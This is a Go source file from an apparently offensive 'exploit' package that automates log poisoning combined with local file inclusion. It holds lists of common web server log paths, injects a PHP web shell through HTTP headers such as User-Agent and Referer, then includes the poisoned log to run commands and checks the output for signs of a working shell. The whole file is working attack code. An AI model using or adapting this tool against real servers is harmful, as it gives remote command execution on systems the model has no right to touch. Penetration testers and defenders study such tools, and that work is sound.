package exploit

// InjectionPoint represents an HTTP header injection point
type InjectionPoint struct {
	Name   string
	Header string
}

// PoisonResult represents the result of log poisoning
type PoisonResult struct {
	LogPath        string
	InjectionPoint string
	OS             string
	Success        bool
	ShellURL       string
}

// DefaultInjectionPoints returns common injection points
func DefaultInjectionPoints() []InjectionPoint {
	return []InjectionPoint{
		{Name: "User-Agent", Header: "User-Agent"},
		{Name: "X-Forwarded-For", Header: "X-Forwarded-For"},
		{Name: "Referer", Header: "Referer"},
		{Name: "Cookie", Header: "Cookie"},
	}
}

// LogPath represents a log file path
type LogPath struct {
	OS    string
	Paths []string
}

// DefaultLogPaths returns common log paths
func DefaultLogPaths() []LogPath {
	return []LogPath{
		{
			OS: "linux",
			Paths: []string{
				"/var/log/apache2/access.log",
				"/var/log/apache2/error.log",
				"/var/log/httpd/access_log",
				"/var/log/httpd/error_log",
				"/var/log/nginx/access.log",
				"/var/log/nginx/error.log",
				"/var/log/lighttpd/access.log",
				"/var/log/lighttpd/error.log",
				"/var/log/apache/access.log",
				"/var/log/apache/error.log",
			},
		},
		{
			OS: "windows",
			Paths: []string{
				"C:\\inetpub\\logs\\LogFiles\\W3SVC1\\access.log",
				"C:\\inetpub\\logs\\LogFiles\\W3SVC2\\access.log",
				"C:\\xampp\\apache\\logs\\access.log",
				"C:\\xampp\\apache\\logs\\error.log",
				"C:\\wamp\\logs\\access.log",
				"C:\\wamp\\logs\\error.log",
				"C:\\Program Files\\Apache Software Foundation\\Apache2.4\\logs\\access.log",
			},
		},
	}
}

// LogPoisoner handles log poisoning attacks
type LogPoisoner struct {
	injectionPoints []InjectionPoint
	logPaths        []LogPath
	httpClient      HTTPClientInterface
	shellPayload    string
}

// HTTPClientInterface defines HTTP client methods
type HTTPClientInterface interface {
	GetWithHeader(url, headerName, headerValue string) (string, error)
	PostWithHeader(url, data, headerName, headerValue string) (string, error)
}

// NewLogPoisoner creates a new log poisoner
func NewLogPoisoner(client HTTPClientInterface) *LogPoisoner {
	return &LogPoisoner{
		injectionPoints: DefaultInjectionPoints(),
		logPaths:        DefaultLogPaths(),
		httpClient:      client,
		shellPayload:    "<?php system($_GET['cmd']); ?>",
	}
}

// SetShellPayload sets the shell payload to inject
func (lp *LogPoisoner) SetShellPayload(payload string) {
	lp.shellPayload = payload
}

// Poison attempts log poisoning
func (lp *LogPoisoner) Poison(targetURL, param string) ([]PoisonResult, error) {
	results := make([]PoisonResult, 0)

	// First, try to find readable log files
	for _, logPath := range lp.logPaths {
		for _, path := range logPath.Paths {
			// Test if log file is readable
			testURL := targetURL + "?" + param + "=" + path
			resp, err := lp.httpClient.GetWithHeader(testURL, "", "")
			if err == nil && lp.isLogReadable(resp) {
				// Try to poison
				for _, ip := range lp.injectionPoints {
					poisoned := lp.poisonLog(targetURL, param, path, ip)
					if poisoned {
						results = append(results, PoisonResult{
							LogPath:        path,
							InjectionPoint: ip.Name,
							OS:             logPath.OS,
							Success:        true,
							ShellURL:       targetURL + "?" + param + "=" + path + "&cmd=id",
						})
					}
				}
			}
		}
	}

	return results, nil
}

// poisonLog attempts to poison a log file
func (lp *LogPoisoner) poisonLog(targetURL, param, logPath string, ip InjectionPoint) bool {
	// Send request with injected payload in header
	_, err := lp.httpClient.GetWithHeader(targetURL, ip.Header, lp.shellPayload)
	if err != nil {
		return false
	}

	// Check if the request was logged (by trying to include the log)
	testURL := targetURL + "?" + param + "=" + logPath + "&cmd=id"
	resp2, err := lp.httpClient.GetWithHeader(testURL, "", "")
	if err != nil {
		return false
	}

	// Check if shell is present
	return lp.isShellActive(resp2)
}

// isLogReadable checks if response indicates readable log
func (lp *LogPoisoner) isLogReadable(resp string) bool {
	indicators := []string{
		"GET /",
		"HTTP/1.",
		"POST /",
		"200 OK",
		"304 Not Modified",
	}
	for _, indicator := range indicators {
		if containsSubstring(resp, indicator) {
			return true
		}
	}
	return false
}

// isShellActive checks if shell is present
func (lp *LogPoisoner) isShellActive(resp string) bool {
	shellIndicators := []string{
		"uid=",
		"gid=",
		"root",
		"daemon",
		"www-data",
	}
	for _, indicator := range shellIndicators {
		if containsSubstring(resp, indicator) {
			return true
		}
	}
	return false
}

func containsSubstring(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsSubstringHelper(s, substr))
}

func containsSubstringHelper(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

// GetLogPaths returns all configured log paths
func (lp *LogPoisoner) GetLogPaths() []LogPath {
	return lp.logPaths
}

// GetInjectionPoints returns all configured injection points
func (lp *LogPoisoner) GetInjectionPoints() []InjectionPoint {
	return lp.injectionPoints
}
